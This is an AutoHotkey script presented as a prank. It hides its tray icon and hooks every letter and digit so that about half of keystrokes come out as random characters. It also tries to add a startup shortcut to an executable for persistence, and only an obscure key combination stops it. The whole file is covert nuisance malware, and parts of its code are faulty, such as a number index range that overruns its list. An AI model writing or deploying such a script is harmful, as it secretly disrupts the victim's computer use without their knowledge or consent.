#NoTrayIcon
#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
changeKey(key)
{
    alpha := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    Random, yesOrNo, 1, 2
    if(yesOrNo = 1)
    {
        Random, letter, 1, 26
        Send, % alpha[letter]
    }
    else Send, %key%
}

changeNum(key)
{
    list := [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    Random, yesOrNo, 1, 2
    if(yesOrNo = 1)
    {
        Random, number, 1, 26
        Send, % list[number]
    }
    else Send, %key%
}

:*:a::
changeKey("a")
Return

:*:b::
changeKey("b")
Return

:*:c::
changeKey("c")
Return

:*:d::
changeKey("d")
Return

:*:e::
changeKey("e")
Return

:*:f::
changeKey("f")
Return

:*:g::
changeKey("g")
Return

:*:h::
changeKey("h")
Return

:*:i::
changeKey("i")
Return

:*:j::
changeKey("j")
Return

:*:k::
changeKey("k")
Return

:*:l::
changeKey("l")
Return

:*:m::
changeKey("m")
Return

:*:n::
changeKey("n")
Return

:*:o::
changeKey("o")
Return

:*:p::
changeKey("p")
Return

:*:q::
changeKey("q")
Return

:*:r::
changeKey("r")
Return

:*:s::
changeKey("s")
Return

:*:t::
changeKey("t")
Return

:*:u::
changeKey("u")
Return

:*:v::
changeKey("v")
Return

:*:w::
changeKey("w")
Return

:*:x::
changeKey("x")
Return

:*:y::
changeKey("y")
Return

:*:z::
changeKey("z")
Return

:*:0::
changeNum(0)
Return

:*:1::
changeNum(1)
Return

:*:2::
changeNum(2)
Return

:*:3::
changeNum(3)
Return

:*:4::
changeNum(4)
Return

:*:5::
changeNum(5)
Return

:*:6::
changeNum(6)
Return

:*:7::
changeNum(7)
Return

:*:8::
changeNum(8)
Return

:*:9::
changeNum(9)
Return

FileCreateShortcut, %A_ProgramFiles%\ Comscan\myFavExec.exe,%A_StartupCommon%\myFavExec.lnk

^+!#Esc:: 
exitapp ; To exit this trick press Ctrl + Shift + Alt + Esc + Windows key
Return 